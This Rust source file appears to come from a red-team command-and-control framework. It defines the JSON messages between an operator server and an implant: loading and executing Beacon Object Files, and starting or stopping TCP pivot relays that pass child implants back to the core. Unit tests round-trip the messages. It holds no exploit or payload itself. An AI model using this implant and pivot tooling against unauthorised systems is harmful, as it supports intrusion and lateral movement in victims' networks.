//! ruststrike-protocol: server <-> implant message definitions.
//!
//! Wire format: newline-delimited JSON. Binary BOF payloads are base64-encoded
//! inside the JSON. All messages share a `type` discriminator via the
//! `ServerMessage` / `ImplantMessage` enums.

use serde::{Deserialize, Serialize};

/// Messages flowing server -> implant.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum ServerMessage {
    /// Operator typed `hello` — link check. Implant echoes back.
    Hello,
    /// Load & execute a BOF. `file` is the COFF bytes and `args` is the raw BOF
    /// argument buffer — both base64-encoded (args is binary, not text: the
    /// CS/AdaptixC2 packed format walked by BeaconDataParse/Extract/Int).
    Bof { file: String, args: String },
    /// Start a TCP pivot/relay listener on the implant. The implant binds
    /// `bind_ip:port` (port 0 = OS-assigned), spawns an accept loop, and
    /// replies `RelayStarted` with the actual port. Each accepted child
    /// connection is spliced onto a fresh connection to the core, so the child
    /// appears as a normal new implant at the core (transparent pivot). The
    /// `relay_id` is core-assigned so the core can correlate the async reply.
    RelayListen {
        relay_id: String,
        bind_ip: String,
        #[serde(default)]
        port: u16,
    },
    /// Stop a previously-started relay listener. Idempotent: an unknown id
    /// still yields `RelayStopped`.
    RelayStop {
        relay_id: String,
    },
}

/// Messages flowing implant -> server.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum ImplantMessage {
    /// Reply to a `Hello` from the operator.
    Hello { data: String },
    /// Successful BOF (or command) output.
    Output { data: String },
    /// Error surfaced while handling a request.
    Error { data: String },
    /// Relay listener is up. `port` is the actual bound port (matters when the
    /// request asked for port 0 = auto).
    RelayStarted {
        relay_id: String,
        bind_ip: String,
        port: u16,
    },
    /// Relay listener stopped (clean stop or unknown id).
    RelayStopped {
        relay_id: String,
    },
    /// Relay listener failed to start (e.g. port taken).
    RelayError {
        relay_id: String,
        data: String,
    },
}

impl ServerMessage {
    pub fn to_json(&self) -> String {
        serde_json::to_string(self).expect("serialize")
    }
}

impl ImplantMessage {
    pub fn to_json(&self) -> String {
        serde_json::to_string(self).expect("serialize")
    }
}

/// Decode a BOF file payload (base64) -> raw COFF bytes.
pub fn decode_bof(b64: &str) -> anyhow::Result<Vec<u8>> {
    use base64::Engine;
    Ok(base64::engine::general_purpose::STANDARD.decode(b64)?)
}

/// Encode raw COFF bytes -> base64 string for transport.
pub fn encode_bof(bytes: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(bytes)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn roundtrip_server_messages() {
        let hello = ServerMessage::Hello;
        let s = hello.to_json();
        assert!(s.contains("\"type\":\"hello\""));

        let bof = ServerMessage::Bof { file: "AAAA".into(), args: "x".into() };
        let s = bof.to_json();
        let back: ServerMessage = serde_json::from_str(&s).unwrap();
        match back {
            ServerMessage::Bof { args, .. } => assert_eq!(args, "x"),
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn roundtrip_implant_messages() {
        let out = ImplantMessage::Output { data: "hello from bof".into() };
        let s = out.to_json();
        let back: ImplantMessage = serde_json::from_str(&s).unwrap();
        match back {
            ImplantMessage::Output { data } => assert_eq!(data, "hello from bof"),
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn bof_encoding_roundtrips() {
        let raw = vec![0u8, 1, 2, 255, 128];
        let enc = encode_bof(&raw);
        let dec = decode_bof(&enc).unwrap();
        assert_eq!(dec, raw);
    }

    #[test]
    fn roundtrip_relay_messages() {
        let listen = ServerMessage::RelayListen {
            relay_id: "rl-abcd".into(),
            bind_ip: "0.0.0.0".into(),
            port: 0,
        };
        let s = listen.to_json();
        assert!(s.contains("\"type\":\"relay_listen\""), "{s}");
        assert!(s.contains("\"relay_id\":\"rl-abcd\""), "{s}");
        let back: ServerMessage = serde_json::from_str(&s).unwrap();
        match back {
            ServerMessage::RelayListen { relay_id, bind_ip, port } => {
                assert_eq!(relay_id, "rl-abcd");
                assert_eq!(bind_ip, "0.0.0.0");
                assert_eq!(port, 0);
            }
            _ => panic!("wrong variant"),
        }

        let stop = ServerMessage::RelayStop { relay_id: "rl-abcd".into() };
        let s = stop.to_json();
        assert!(s.contains("\"type\":\"relay_stop\""), "{s}");
        let back: ServerMessage = serde_json::from_str(&s).unwrap();
        match back {
            ServerMessage::RelayStop { relay_id } => assert_eq!(relay_id, "rl-abcd"),
            _ => panic!("wrong variant"),
        }

        let started = ImplantMessage::RelayStarted {
            relay_id: "rl-abcd".into(),
            bind_ip: "0.0.0.0".into(),
            port: 51234,
        };
        let s = started.to_json();
        assert!(s.contains("\"type\":\"relay_started\""), "{s}");
        assert!(s.contains("\"port\":51234"), "{s}");
        let back: ImplantMessage = serde_json::from_str(&s).unwrap();
        match back {
            ImplantMessage::RelayStarted { port, .. } => assert_eq!(port, 51234),
            _ => panic!("wrong variant"),
        }

        let err = ImplantMessage::RelayError {
            relay_id: "rl-abcd".into(),
            data: "bind failed".into(),
        };
        let s = err.to_json();
        assert!(s.contains("\"type\":\"relay_error\""), "{s}");
        assert!(s.contains("\"data\":\"bind failed\""), "{s}");

        let stopped = ImplantMessage::RelayStopped { relay_id: "rl-abcd".into() };
        let s = stopped.to_json();
        assert!(s.contains("\"type\":\"relay_stopped\""), "{s}");
    }
}
